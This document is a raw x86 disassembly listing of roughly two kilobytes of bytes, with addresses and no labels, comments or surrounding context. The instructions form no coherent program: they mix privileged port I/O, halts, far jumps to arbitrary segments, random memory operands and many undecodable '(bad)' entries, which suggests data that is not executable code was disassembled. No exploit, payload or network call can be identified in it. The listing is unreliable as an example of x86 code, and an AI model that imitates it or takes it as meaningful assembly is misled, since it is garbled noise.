  420236:	fs xor al,cl
  420239:	in     al,0x40
  42023b:	movups xmm3,XMMWORD PTR [edx]
  42023e:	pop    edx
  42023f:	data16 mov ds:0xabbb0ab4,al
  420245:	cmp    cl,bh
  420247:	shl    BYTE PTR [ebp+0x9b4ecfa],1
  42024d:	lds    esp,FWORD PTR [edx]
  42024f:	add    BYTE PTR [ebp+esi*4-0x4b1b63d1],ah
  420256:	push   es
  420257:	ret    
  420258:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420259:	icebp  
  42025a:	sub    bl,bh
  42025c:	adc    BYTE PTR [ecx+0x1875b0b9],dh
  420262:	mov    ebp,0xd9f99926
  420267:	repnz mov esp,DWORD PTR [edx]
  42026a:	lods   al,BYTE PTR ds:[esi]
  42026b:	dec    eax
  42026d:	push   ebx
  42026e:	retf   0x9c76
  420271:	jae    0x420297
  420273:	imul   edi,DWORD PTR [ebp-0x6b4192f1],0xffffffb2
  42027a:	nop
  42027b:	pop    ebp
  42027c:	dec    edx
  42027d:	push   es
  42027e:	sub    ebp,DWORD PTR [edx-0x67]
  420281:	in     eax,0x3a
  420283:	push   es
  420284:	xor    BYTE PTR [edx+0x51],dl
  420287:	sub    eax,0x96271a59
  42028c:	loopne 0x4202fe
  42028e:	scas   eax,DWORD PTR es:[edi]
  42028f:	sbb    ebp,edi
  420291:	or     al,0xaa
  420293:	rcr    esp,cl
  420295:	hlt    
  420296:	int    0xb9
  420298:	xlat   BYTE PTR ds:[ebx]
  420299:	leave  
  42029a:	sbb    al,0xfa
  42029c:	and    BYTE PTR [edi],bl
  42029e:	aaa    
  42029f:	enter  0xd186,0xd4
  4202a3:	mov    eax,ds:0x32ea8af
  4202a8:	mov    cl,0x78
  4202aa:	push   ecx
  4202ab:	cmp    eax,edi
  4202ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4202ae:	scas   al,BYTE PTR es:[edi]
  4202af:	inc    edx
  4202b0:	pop    ds
  4202b1:	jle    0x42030d
  4202b3:	cmp    DWORD PTR [ebp-0x47f93d3e],0xffffffdb
  4202ba:	cld    
  4202bb:	sti    
  4202bc:	jg     0x4202ca
  4202be:	ins    BYTE PTR es:[edi],dx
  4202bf:	sub    BYTE PTR [edi-0x4e],0xcc
  4202c3:	pop    ebp
  4202c4:	jo     0x4202ec
  4202c6:	mov    ecx,0x35c2ac84
  4202cb:	push   cs
  4202cc:	out    0xb5,al
  4202ce:	or     ah,BYTE PTR [edx-0x14318b49]
  4202d4:	adc    esp,ebp
  4202d6:	jmp    0x117e:0x7552c6ff
  4202dd:	loopne 0x42032b
  4202df:	xor    eax,0x70aeb63f
  4202e4:	ins    BYTE PTR es:[edi],dx
  4202e5:	stos   BYTE PTR es:[edi],al
  4202e6:	push   eax
  4202e7:	lahf   
  4202e8:	mov    bl,0x68
  4202ea:	jge    0x42030f
  4202ec:	jno    0x420298
  4202ee:	dec    ebx
  4202ef:	lahf   
  4202f0:	test   al,0x2e
  4202f2:	loopne 0x4202b6
  4202f4:	mov    ah,0x59
  4202f6:	jl     0x42029d
  4202f8:	lock or al,0x50
  4202fb:	(bad)  
  4202fc:	jne    0x4202f9
  4202fe:	in     al,dx
  4202ff:	imul   ecx,DWORD PTR [esi],0xd61fb1
  420305:	push   es
  420306:	jb     0x4202c3
  420308:	in     eax,0xd0
  42030a:	test   BYTE PTR [ebx+0x3e22b1fb],al
  420310:	inc    ebx
  420311:	fadd   QWORD PTR [eax]
  420313:	shr    DWORD PTR ss:[edx],cl
  420316:	stc    
  420317:	fwait
  420318:	push   esi
  420319:	jp     0x42032e
  42031b:	retf   0xb411
  42031e:	sub    eax,0xbc5020d7
  420323:	pop    es
  420324:	pop    edi
  420325:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420326:	lods   al,BYTE PTR ds:[esi]
  420327:	jmp    0x553cd2b7
  42032c:	or     BYTE PTR [eax-0x39db97cf],dl
  420332:	and    BYTE PTR [ecx-0x25a55f86],bl
  420338:	ja     0x420379
  42033a:	adc    DWORD PTR ds:0xc18afce1,esp
  420340:	pop    esi
  420341:	jmp    0x4203ad
  420343:	addr16 push esp
  420346:	scas   eax,DWORD PTR es:[edi]
  420347:	push   ds
  420348:	mov    bl,0x1c
  42034a:	ins    BYTE PTR es:[edi],dx
  42034b:	cmp    esi,ebx
  42034d:	add    BYTE PTR [edx],dl
  42034f:	mov    edx,0x40ba1daf
  420354:	sub    ecx,eax
  420356:	adc    bl,BYTE PTR [edx-0x37]
  420359:	icebp  
  42035a:	pop    ds
  42035b:	ja     0x420314
  42035d:	mov    bl,0x3a
  42035f:	xchg   ebx,eax
  420360:	xor    DWORD PTR [ecx+0x577472a1],esi
  420366:	hlt    
  420367:	mov    ah,0x9
  420369:	cld    
  42036a:	daa    
  42036b:	push   0x4f
  42036d:	cdq    
  42036e:	xchg   BYTE PTR [edi],ch
  420370:	ror    DWORD PTR [ecx],cl
  420372:	push   edx
  420373:	jo     0x420382
  420375:	repz mov dh,ch
  420378:	dec    ecx
  420379:	jo     0x4203a6
  42037b:	loopne 0x420357
  42037d:	int3   
  42037e:	mov    esp,esp
  420380:	mov    al,BYTE PTR [ebx+0x41]
  420383:	pop    ebx
  420384:	lods   al,BYTE PTR ds:[esi]
  420385:	push   0xffffff9c
  420387:	cmp    DWORD PTR [esi-0x66],esi
  42038a:	aad    0x88
  42038c:	jl     0x420314
  42038e:	push   0x7bcae3e8
  420393:	and    edx,DWORD PTR [ebx]
  420395:	nop
  420396:	add    eax,0x3779816
  42039b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42039c:	(bad)
  4203a0:	call   0xd5de:0x8188a9b2
  4203a7:	lock sub eax,0xea39789b
  4203ad:	dec    esp
  4203ae:	fld    TBYTE PTR [esp+ebx*1]
  4203b1:	mov    edx,0x4ea145bf
  4203b6:	stos   DWORD PTR es:[edi],eax
  4203b7:	mov    edi,cs
  4203b9:	mov    ds:0xd537e2d5,eax
  4203be:	retf   
  4203bf:	jne    0x4203d1
  4203c1:	or     BYTE PTR [edi-0x2],bl
  4203c4:	in     al,dx
  4203c5:	or     eax,DWORD PTR [ebx]
  4203c7:	push   0x1def84bc
  4203cc:	add    DWORD PTR [ecx-0x38],edi
  4203cf:	sbb    BYTE PTR [eax],al
  4203d1:	shl    BYTE PTR [eax],cl
  4203d3:	or     al,0xc
  4203d5:	(bad)  
  4203d6:	jae    0x420361
  4203d8:	cmp    al,0x60
  4203da:	sar    BYTE PTR [ebx-0x6272dd0b],0x94
  4203e1:	fisubr WORD PTR [ecx+0x44367d23]
  4203e7:	(bad)  
  4203e8:	mov    esp,0x4a95536e
  4203ed:	xor    BYTE PTR [esi],0x84
  4203f0:	mov    ds:0xc1c82b8b,al
  4203f5:	stos   BYTE PTR es:[edi],al
  4203f6:	mov    al,0x66
  4203f8:	and    ebx,ecx
  4203fa:	xor    BYTE PTR [edx-0x15],ah
  4203fd:	mov    WORD PTR [ecx-0x13],fs
  420400:	or     DWORD PTR [edx-0xfbbe24],esi
  420406:	jecxz  0x42045d
  420408:	int3   
  420409:	pop    ebx
  42040a:	add    DWORD PTR [edi+0x2c],esp
  42040d:	adc    eax,0xdb02859a
  420412:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420413:	leave  
  420414:	outs   dx,DWORD PTR ds:[esi]
  420415:	dec    BYTE PTR [edi+0x6a]
  420418:	xchg   edi,eax
  420419:	inc    ebp
  42041a:	(bad)  
  42041b:	(bad)  
  42041c:	imul   DWORD PTR [edx+0x5f]
  42041f:	aas    
  420420:	jmp    0x2a66:0x5ed679f
  420427:	(bad)  
  420429:	adc    dh,bl
  42042b:	mov    BYTE PTR [edx-0x3200ccf3],bh
  420431:	sub    al,bl
  420433:	inc    ebx
  420434:	iret   
  420435:	repz into 
  420437:	inc    ecx
  420438:	xchg   edx,eax
  420439:	fs test bh,bl
  42043c:	jae    0x4204ad
  42043e:	jecxz  0x4203cc
  420440:	push   ecx
  420441:	addr16 fwait
  420443:	pop    es
  420444:	pop    ebp
  420445:	inc    ebp
  420446:	and    eax,ebx
  420448:	jmp    0x4bac:0xdc023294
  42044f:	fnstenv [eax-0x4089f19f]
  420455:	loopne 0x4204ba
  420457:	mov    al,ds:0x7bf00144
  42045c:	jne    0x4204b2
  42045e:	and    eax,DWORD PTR [ecx+0x37247f84]
  420464:	xor    BYTE PTR [esi],ah
  420466:	shr    DWORD PTR [ebx-0x19],cl
  420469:	xchg   ecx,eax
  42046a:	fdivr  st,st(3)
  42046c:	out    0x1b,al
  42046e:	dec    eax
  42046f:	mov    ch,0x3a
  420471:	test   al,0x7c
  420473:	scas   eax,DWORD PTR es:[edi]
  420474:	dec    ecx
  420475:	jg     0x4204be
  420477:	sub    DWORD PTR [edi+0x48],eax
  42047a:	data16 loopne 0x42044a
  42047d:	jge    0x42044a
  42047f:	repz xchg ebp,eax
  420481:	jns    0x420467
  420483:	call   FWORD PTR [ecx+0x666556ba]
  420489:	bound  edx,QWORD PTR [edi+0x6c201ea3]
  42048f:	xchg   ebp,eax
  420490:	inc    eax
  420491:	ret    
  420492:	leave  
  420493:	mov    edi,cs
	...
  420511:	add    BYTE PTR [eax],al
  420513:	add    BYTE PTR [ebx+ecx*8],dl
  420516:	mov    bl,0x9a
  420518:	(bad)  
  420519:	cli    
  42051a:	cmp    eax,0x190968cf
  42051f:	mov    esi,DWORD PTR [ecx+0x5bd52407]
  420525:	popf   
  420526:	add    DWORD PTR [eax],eax
  420528:	imul   eax,DWORD PTR [edi],0x5d960000
  42052e:	outs   dx,BYTE PTR ds:[esi]
  42052f:	mov    WORD PTR [ecx-0x3ce4ce34],ss
  420535:	mov    eax,0xab34ab
  42053a:	es addr16 sub ebx,esp
  42053e:	mov    ah,0x4c
  420540:	xchg   esi,eax
  420541:	shr    DWORD PTR [esi+0x50],0x49
  420545:	cwde   
  420546:	pop    edi
  420547:	mov    al,BYTE PTR [ebx+ebp*1]
  42054a:	mov    BYTE PTR [esi],cl
  42054c:	ss sub al,0x66
  42054f:	out    0x4d,al
  420551:	stos   DWORD PTR es:[edi],eax
  420552:	ja     0x420585
  420554:	pop    DWORD PTR [eax-0x6d]
  420557:	xchg   ebp,eax
  420558:	cmp    al,0x2f
  42055a:	ss or  al,0x64
  42055d:	xchg   esi,eax
  42055e:	retf   0x724
  420561:	sub    DWORD PTR [ebx-0x7f],ecx
  420564:	(bad)  
  420565:	aad    0x55
  420567:	sub    BYTE PTR [eax+0x2d],0x4e
  42056b:	jp     0x420562
  42056d:	mov    WORD PTR [esp+edi*8],?
  420570:	js     0x42056b
  420572:	repz cs or ah,ch
  420576:	and    eax,0xbb437dd
  42057b:	xchg   ah,al
  42057d:	outs   dx,BYTE PTR ds:[esi]
  42057e:	xchg   ebp,eax
  42057f:	pop    ss
  420580:	dec    edx
  420581:	lea    eax,[eax]
  420583:	stos   DWORD PTR es:[edi],eax
  420584:	xchg   esi,eax
  420585:	nop
  420586:	xor    dl,BYTE PTR [ecx]
  420588:	pop    ebp
  420589:	mov    ah,0xde
  42058b:	sub    DWORD PTR [edi+0x1e],ebx
  42058e:	imul   edi,DWORD PTR [eax],0xffffffb4
  420591:	jl     0x42053f
  420593:	xor    bh,dh
  420595:	daa    
  420596:	enter  0x12fb,0x8a
  42059a:	jb     0x420527
  42059c:	mov    cl,0xb3
  42059e:	add    ebp,ebx
  4205a0:	iret   
  4205a1:	or     al,0xf9
  4205a3:	mov    edx,0x67da8caf
  4205a8:	xchg   edx,eax
  4205a9:	adc    BYTE PTR [ecx-0xa966bd8],cl
  4205af:	rcr    BYTE PTR [eax-0x451bbe95],0xb3
  4205b6:	test   al,0x1d
  4205b8:	xchg   esp,eax
  4205b9:	mov    bh,0xc9
  4205bb:	mov    edx,0xdd2992aa
  4205c0:	lds    edx,FWORD PTR [esi+0x77]
  4205c3:	push   eax
  4205c4:	lea    ecx,[ecx]
  4205c6:	cmp    al,0xef
  4205c8:	paddsb mm0,QWORD PTR [edi+ebx*4]
  4205cc:	arpl   WORD PTR [eax+0x4a66aa08],di
  4205d2:	and    al,0xc1
  4205d4:	mov    ecx,0xca99d24c
  4205d9:	jne    0x420626
  4205db:	dec    esp
  4205dc:	add    BYTE PTR [ecx],0x97
  4205df:	jp     0x42062c
  4205e1:	push   eax
  4205e2:	fwait
  4205e3:	xor    eax,0xf9ec8d3b
  4205e8:	retf   0xeed3
  4205eb:	mov    esi,0x1801a2a7
  4205f0:	pusha  
  4205f1:	(bad)  
  4205f2:	in     eax,dx
  4205f3:	loop   0x4205a6
  4205f5:	sub    al,0x2d
  4205f7:	fisub  DWORD PTR [ebx+0x20]
  4205fa:	adc    DWORD PTR [ebp-0xd22bedd],0xffffffa0
  420601:	arpl   WORD PTR [edi],bp
  420603:	cld    
  420604:	call   0x3ff722b6
  420609:	xchg   ebp,eax
  42060a:	ret    0xde06
  42060d:	popa   
  42060e:	push   esi
  42060f:	sub    DWORD PTR ds:[edi+0x1bfe3eee],ebp
  420616:	mov    edi,0x3c7f5858
  42061b:	sbb    BYTE PTR [eax+esi*8+0x5e],cl
  42061f:	add    bh,dh
  420621:	pop    eax
  420622:	push   ebx
  420623:	out    0xe,eax
  420625:	mov    ah,0x7
  420627:	std    
  420628:	or     al,0x4c
  42062a:	inc    ebx
  42062b:	inc    BYTE PTR [ecx-0x6f6937e3]
  420631:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420632:	aas    
  420633:	jg     0x4205f3
  420635:	and    DWORD PTR [ebx-0x3f],eax
  420638:	push   ds
  420639:	aam    0xa4
  42063b:	inc    ebp
  42063c:	lock fbstp TBYTE PTR [edi+0x3339491a]
  420643:	xchg   ch,dl
  420645:	and    BYTE PTR [ebp-0x61a14740],ah
  42064b:	inc    esi
  42064c:	out    dx,al
  42064d:	addr16 add cl,dh
  420650:	repnz stc 
  420652:	mov    ebx,0x39b3e113
  420657:	leave  
  420658:	pop    edx
  420659:	bndldx (bad),[esi+0x3f]
  42065d:	cli    
  42065e:	sub    BYTE PTR [edx+0xc],cl
  420661:	pop    ss
  420662:	mov    bh,0x35
  420664:	cmp    dl,BYTE PTR [eax]
  420666:	rcl    DWORD PTR [eax-0x3],cl
  420669:	push   esi
  42066a:	jno    0x4206e8
  42066c:	or     ebx,edi
  42066e:	fsub   QWORD PTR ss:[ecx]
  420671:	mov    cl,0xb0
  420673:	pop    ebp
  420674:	leave  
  420675:	inc    ebp
  420676:	popa   
  420677:	das    
  420678:	cli    
  420679:	cmp    eax,0x685822de
  42067e:	lock or BYTE PTR [edi+0x12],ch
  420682:	das    
  420683:	or     DWORD PTR [ebp-0x205ef8ce],ebx
  420689:	xchg   ecx,eax
  42068a:	lea    ecx,[ebx-0x16f9235d]
  420690:	loop   0x4206ac
  420692:	scas   eax,DWORD PTR es:[edi]
  420693:	scas   al,BYTE PTR es:[edi]
  420694:	inc    ecx
  420695:	cwde   
  420696:	cli    
  420697:	call   0xaf81:0x3dbfe4a1
  42069e:	cmp    ah,BYTE PTR [ebx-0x76c7b427]
  4206a4:	rol    BYTE PTR [esi],0x70
  4206a7:	xchg   ecx,eax
  4206a8:	jns    0x420725
  4206aa:	add    DWORD PTR [esi],ebp
  4206ac:	sub    bl,dh
  4206ae:	lea    edx,ds:0xbf8cb27f
  4206b4:	push   edi
  4206b5:	mov    ebx,0x3cf1d7d3
  4206ba:	lahf   
  4206bb:	and    eax,esp
  4206bd:	in     al,0x71
  4206bf:	jb     0x420642
  4206c1:	cli    
  4206c2:	call   DWORD PTR [eax-0x4d]
  4206c5:	xor    DWORD PTR [ecx+0x5d78230],edx
  4206cb:	or     al,0x92
  4206cd:	xor    al,0x13
  4206cf:	fs sub al,0x57
  4206d2:	jmp    0x420742
  4206d4:	fmul   DWORD PTR [ecx+edi*1-0x183e019e]
  4206db:	sub    edi,esp
  4206dd:	dec    esp
  4206de:	sahf   
  4206df:	mov    edi,0x3b94c343
  4206e4:	in     eax,0x90
  4206e6:	sbb    esp,ecx
  4206e8:	ins    DWORD PTR es:[edi],dx
  4206e9:	jl     0x4206b7
  4206eb:	repz cmp al,0xb6
  4206ee:	outs   dx,DWORD PTR ds:[esi]
  4206ef:	fistp  DWORD PTR gs:[esi+0x11]
  4206f3:	add    eax,ebp
  4206f5:	std    
  4206f6:	fwait
  4206f7:	nop
  4206f8:	(bad)  
  4206f9:	gs xchg ebx,eax
  4206fb:	ins    DWORD PTR es:[edi],dx
  4206fc:	pop    es
  4206fd:	sar    BYTE PTR [edx+0x3cf44e39],1
  420703:	mov    eax,ds:0xde05e1d3
  420708:	mov    eax,ds:0x3ecf1b05
  42070d:	mov    bh,0xfa
  42070f:	out    0xb0,eax
  420711:	push   ecx
  420712:	dec    ebp
  420713:	push   ebx
  420714:	push   edi
  420715:	and    DWORD PTR [esi+0x71],ebp
  420718:	cs dec esi
  42071a:	jl     0x42070e
  42071c:	inc    esp
  42071d:	inc    ebx
  42071e:	add    al,0xc9
  420720:	adc    edi,DWORD PTR [edi+0x47]
  420723:	xor    BYTE PTR [ebx+0x14],bh
  420726:	sub    DWORD PTR [esi],edi
  420728:	mov    WORD PTR [ecx+0x4d],?
  42072b:	pushf  
  42072c:	adc    BYTE PTR [edx-0x67],0x1f
  420730:	aad    0x60
  420732:	sar    DWORD PTR [edi+0x1bd8417e],1
  420738:	clc    
  420739:	sbb    ah,BYTE PTR [edx+0xd]
  42073c:	sbb    eax,0x282dd093
  420741:	lods   al,BYTE PTR ds:[esi]
  420742:	xor    DWORD PTR [ebp+0x22],esi
  420745:	sub    eax,0xfe07b46f
  42074a:	repnz aas 
  42074c:	jmp    0xa5151337
  420751:	dec    ebp
  420752:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420753:	dec    ecx
  420754:	mov    eax,0xc12aae27
  420759:	call   0xb27f:0xfdce3cfc
  420760:	push   esp
  420761:	adc    BYTE PTR [edi-0x586b1abd],bh
  420767:	iret   
  420768:	cld    
  420769:	pop    es
  42076a:	inc    edi
  42076b:	mov    ecx,DWORD PTR [esi+0x5afb0f1c]
  420771:	mov    ah,0xdb
  420773:	sbb    eax,0x1be4bd3a
  420778:	call   0x930d:0x4033e59e
  42077f:	ds imul esp,esp,0xffffff8d
  420783:	call   0x450f9163
  420788:	pop    es
  420789:	jnp    0x420721
  42078b:	test   al,0xfd
  42078d:	sar    DWORD PTR [ebx-0x5d836cce],1
  420793:	daa    
  420794:	imul   esi,DWORD PTR [edi-0x22],0x324973e
  42079b:	ret    0x988e
  42079e:	clc    
  42079f:	pop    edi
  4207a0:	mov    fs,WORD PTR [esi-0x25]
  4207a3:	adc    ebp,DWORD PTR [ebx]
  4207a5:	mov    edx,0x6a02f36c
  4207aa:	daa    
  4207ab:	cli    
  4207ac:	and    DWORD PTR [esi+0x20062a79],ebx
  4207b2:	fadd   DWORD PTR [edi+0x7e]
  4207b5:	pop    edx
  4207b6:	retf   
  4207b7:	(bad)  
  4207b8:	push   0x71
  4207ba:	lock call 0x22e6252
  4207c0:	fldlg2 
  4207c2:	out    dx,eax
  4207c3:	fldenv [eax-0x50]
  4207c6:	jae    0x42076e
  4207c8:	mov    bh,BYTE PTR [ebx+0x37]
  4207cb:	pop    eax
  4207cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4207cd:	(bad)  
  4207ce:	add    BYTE PTR [ebp+0x4d3a0817],al
  4207d4:	frstor [ecx-0x70]
  4207d7:	adc    ebx,esp
  4207d9:	fwait
  4207da:	clc    
  4207db:	xor    al,0xf
  4207dd:	mov    ds:0x1ecb8bab,al
  4207e2:	daa    
  4207e3:	push   ds
  4207e4:	add    esi,DWORD PTR [ebp-0x10]
  4207e7:	and    eax,0x55b0db88
  4207ec:	scas   al,BYTE PTR es:[edi]
  4207ed:	jle    0x4207a8
  4207ef:	xchg   ebx,eax
  4207f0:	cmp    DWORD PTR [ecx+0x6f04c29e],eax
  4207f6:	mov    ecx,0x12fde4c
  4207fb:	mov    dl,0x4f
  4207fd:	ss mov cl,0x5d
  420800:	test   BYTE PTR [edi+eax*8-0x2],ch
  420804:	aad    0xda
  420806:	repz fstp TBYTE PTR [edx-0x678614b9]
  42080d:	adc    bh,BYTE PTR [ecx]
  42080f:	je     0x4207f7
  420811:	jge    0x4207a2
  420813:	in     al,0x99
  420815:	gs mov edx,0x1fb99421
  42081b:	jge    0x420875
  42081d:	ja     0x4207bc
  42081f:	pop    ecx
  420820:	test   al,0xe
  420822:	dec    ecx
  420823:	nop
  420824:	pop    edx
  420825:	xchg   ecx,eax
  420826:	xor    eax,ecx
  420828:	pop    edx
  420829:	int    0xe1
  42082b:	mov    eax,0x8177e25
  420830:	and    DWORD PTR [ebx],0xffffffa7
  420833:	stc    
  420834:	push   ebx
  420835:	cdq    
  420836:	add    al,0xc9
  420838:	push   0xffffffd7
  42083a:	push   ss
  42083b:	or     BYTE PTR [edx-0x29caff05],bh
  420841:	(bad)  
  420843:	cmp    esp,DWORD PTR ds:0xcf4ae863
  420849:	adc    eax,0xe678081a
  42084e:	idiv   BYTE PTR [edx]
  420850:	pop    ecx
  420851:	fwait
  420852:	ja     0x420865
  420854:	push   ecx
  420855:	push   esi
  420856:	mov    dh,0xb9
  420858:	pxor   mm2,mm0
  42085b:	cld    
  42085c:	les    edi,FWORD PTR [ebx+0x3d147540]
  420862:	dec    eax
  420863:	xchg   edx,eax
  420864:	pop    esp
  420865:	dec    esp
  420866:	lahf   
  420867:	cmp    DWORD PTR ds:0x595e4b72,0xf0aa9aa
  420871:	mov    esi,0xa5ddfb6a
  420876:	xchg   esi,eax
  420877:	arpl   WORD PTR [edx+0x39],sp
  42087a:	pop    ecx
  42087b:	add    eax,esp
  42087d:	and    esp,ecx
  42087f:	mov    esi,0xf04d0280
  420884:	or     al,0x48
  420886:	lods   eax,DWORD PTR ds:[esi]
  420887:	clc    
  420888:	popf   
  420889:	hlt    
  42088a:	mov    esp,0x19d39f70
  42088f:	push   ecx
  420890:	push   esi
  420891:	out    dx,al
  420892:	add    ch,dh
  420894:	stc    
  420895:	out    dx,al
  420896:	out    0x4f,al
  420898:	cwde   
  420899:	jg     0x420902
  42089b:	lods   eax,DWORD PTR ds:[esi]
  42089c:	ds retf 
  42089e:	jae    0x42086c
  4208a0:	adc    DWORD PTR [eax+0x49bedbf6],esi
  4208a6:	loopne 0x420863
  4208a8:	dec    ebx
  4208a9:	test   al,0xab
  4208ab:	mov    ecx,DWORD PTR [ebp-0x647fdc41]
  4208b1:	into   
  4208b2:	mov    al,BYTE PTR [ecx+eiz*4]
  4208b5:	dec    eax
  4208b6:	mov    dh,0xf6
  4208b8:	xchg   esp,eax
  4208b9:	loope  0x4208ca
  4208bb:	aas    
  4208bc:	lea    ebx,[ebp+0x33]
  4208bf:	cmp    ecx,DWORD PTR [edx+0x36771ea1]
  4208c5:	aam    0xa8
  4208c7:	jne    0x42091e
  4208c9:	add    al,bl
  4208cb:	nop
  4208cc:	dec    DWORD PTR [esi-0x59529fc4]
  4208d2:	sbb    BYTE PTR [esi],bl
  4208d4:	call   FWORD PTR [edx-0x1c]
  4208d7:	mov    bl,0x7f
  4208d9:	pop    esi
  4208da:	push   0x16
  4208dc:	xchg   ebp,eax
  4208dd:	or     esp,DWORD PTR gs:[edi]
  4208e0:	ins    BYTE PTR es:[edi],dx
  4208e1:	add    BYTE PTR [edi+edi*8],cl
  4208e4:	call   0xbbcb0718
  4208e9:	cli    
  4208ea:	repnz call 0xbeef:0x3a35b286
  4208f2:	imul   ebx,ecx,0x19
  4208f5:	js     0x420950
  4208f7:	mov    ds:0xbbb5e770,al
  4208fc:	fimul  WORD PTR [ebx-0x56]
  4208ff:	or     eax,DWORD PTR [ebx]
  420901:	daa    
  420902:	dec    eax
  420903:	jns    0x42095a
  420905:	push   esi
  420906:	add    eax,0xd9d6ddc3
  42090b:	adc    al,0xcb
  42090d:	or     ebp,DWORD PTR ds:0x32ed2d99
  420913:	mov    ds:0x9a36d6b2,eax
  420918:	mov    edi,ss
  42091a:	arpl   WORD PTR [edx],sp
  42091c:	pop    esi
  42091d:	xchg   esi,eax
  42091e:	fiadd  DWORD PTR [esi-0x179274af]
  420924:	fsubrp st(6),st
  420926:	xor    ah,al
  420928:	loope  0x420960
  42092a:	rcl    DWORD PTR [edi-0xa2e711],0xfe
  420931:	mov    WORD PTR [ebp+eax*8+0x1b630359],?
  420938:	inc    edi
  420939:	fild   QWORD PTR [ecx*4+0x1f611e5f]
  420940:	jmp    0xdef0:0x963e3fdb
  420947:	inc    eax
  420948:	pop    esi
  420949:	push   ecx
  42094a:	fimul  DWORD PTR [edi]
  42094c:	xchg   esi,eax
  42094d:	adc    al,0x70
  42094f:	mov    edx,0x7bdfbde8
  420954:	push   edi
  420955:	sub    al,0x34
  420957:	pop    ds
  420958:	imul   ebx,DWORD PTR [ebx],0x7a
  42095b:	std    
  42095c:	ficom  DWORD PTR [esp+ebx*2-0x71]
  420960:	and    al,BYTE PTR [ebx+0xf9fa415]
  420966:	adc    eax,0xdd9333fa
  42096b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42096c:	mov    ebx,0xf31a570f
  420971:	stos   BYTE PTR es:[edi],al
  420972:	push   esi
  420973:	lds    esi,FWORD PTR [ebx-0x23d1d48d]
  420979:	gs inc esp
  42097b:	out    0x9f,al
  42097d:	loop   0x42098a
  42097f:	popf   
  420980:	push   esi
  420981:	icebp  
  420982:	mov    edi,0xe27c2806
  420987:	dec    esi
  420988:	sub    dh,dh
  42098a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42098b:	icebp  
  42098c:	aam    0xc3
  42098e:	adc    eax,0x6da09c94
  420993:	leave  
  420994:	pop    es
  420995:	mov    WORD PTR [ecx-0x76],ss
  420998:	push   ds
  420999:	retf   
  42099a:	sbb    esp,DWORD PTR [ebx-0x61]
  42099d:	mov    bh,ch
  42099f:	sub    DWORD PTR [edi],eax
  4209a1:	bound  edx,QWORD PTR [esi+0x27]
  4209a4:	imul   ecx,DWORD PTR [esi],0x19e3e11a
  4209aa:	jl     0x4209a4
  4209ac:	sub    edi,esi
  4209ae:	jnp    0x420975
  4209b0:	test   ebp,ebx
  4209b2:	mov    cl,0xf8
  4209b4:	xchg   edx,eax
  4209b5:	jnp    0x420947
  4209b7:	ds and bl,ch
  4209ba:	fsubr  st,st(1)
  4209bc:	cdq    
  4209bd:	cmp    al,0x74
  4209bf:	cmp    ecx,DWORD PTR [edx+0x5f]
  4209c2:	mov    ch,0xb7
  4209c4:	sub    al,0xf5
  4209c6:	jmp    0xa8cae6e1
  4209cb:	adc    DWORD PTR [eax+ebx*8-0x69d5724],0x66bd6249
  4209d6:	add    DWORD PTR [ecx-0x284293d7],ecx
  4209dc:	jo     0x42099e
  4209de:	and    ah,cl
  4209e0:	or     al,0xda
  4209e2:	in     al,dx
  4209e3:	out    0xd2,al
  4209e5:	add    DWORD PTR [edx],edi
  4209e7:	test   BYTE PTR [edi-0x5e9870f7],ah
  4209ed:	stc    
  4209ee:	(bad)  
  4209ef:	pop    ebp
  4209f0:	xor    ebp,DWORD PTR [ebp*1+0x770c6302]
  4209f7:	dec    edi
  4209f8:	add    BYTE PTR [edx+0x42],ah
  4209fb:	sbb    eax,0x6a8ad8ed
  420a00:	mov    dh,0xff
  420a02:	xchg   ebx,eax
  420a03:	pop    edx
  420a04:	sub    al,0x48
  420a06:	sub    DWORD PTR [ebx+esi*8+0x27],ecx
  420a0a:	push   eax
  420a0b:	(bad)  
  420a0c:	in     al,0xb
  420a0e:	es (bad) 
  420a10:	add    edi,0x3aebbd06
  420a16:	or     BYTE PTR [ebx+edx*2-0x933f202],0xd7
  420a1e:	xchg   ebx,eax
  420a1f:	rcr    DWORD PTR [edi+0xeee2735],cl
  420a25:	cmp    bl,BYTE PTR [edi+edx*1]
  420a28:	rol    DWORD PTR [edx-0x3b2f4314],cl
  420a2e:	pop    ebx
  420a2f:	sti    
  420a30:	outs   dx,DWORD PTR ds:[esi]
  420a31:	ja     0x4209c2
  420a33:	inc    edi
  420a34:	push   edi
  420a35:	mov    ss,WORD PTR [esi+ecx*2]
  420a38:	call   0x37a06585
  420a3d:	jae    0x420a20
  420a3f:	jp     0x420a00
  420a41:	mov    al,ds:0x7eb05346
  420a46:	rol    DWORD PTR [ebp-0x17],cl
  420a49:	xchg   ecx,eax
  420a4a:	pop    esp
  420a4b:	cli    
  420a4c:	pop    eax
  420a4d:	popa   
  420a4e:	(bad)  
  420a4f:	dec    ecx
  420a50:	jp     0x420a7a
  420a52:	lods   eax,DWORD PTR ds:[esi]
  420a53:	in     al,0x22
  420a55:	test   al,0xbb
  420a57:	dec    edi
  420a58:	dec    ebx
  420a59:	iret   
  420a5a:	or     eax,0xd9c5d8fe
  420a5f:	xor    bh,dl
  420a61:	add    cl,dh
  420a63:	sbb    al,0x21
  420a65:	aaa    
  420a66:	push   ss
  420a67:	dec    edi
  420a68:	int3   
  420a69:	and    al,0x71
  420a6b:	test   eax,0x9b2d6029
  420a70:	outs   dx,BYTE PTR ds:[esi]
  420a71:	std    
  420a72:	(bad)  
  420a73:	push   ecx
  420a74:	sbb    eax,0xf16a1c8
  420a79:	xlat   BYTE PTR ds:[ebx]
  420a7a:	imul   BYTE PTR [edi+ebp*1-0xf476be0]
  420a81:	inc    ecx
  420a82:	rol    BYTE PTR [ebx+0x68],0x73
  420a86:	mov    edx,0xefbbc41f
  420a8b:	jecxz  0x420a23
  420a8d:	mov    ebp,0x43df688d
  420a92:	daa    
  420a93:	(bad)  
  420a94:	ficomp DWORD PTR [ebx+edi*8-0x26506142]
  420a9b:	nop
  420a9c:	cld    
  420a9d:	mov    ds:0x2ccfbe58,eax
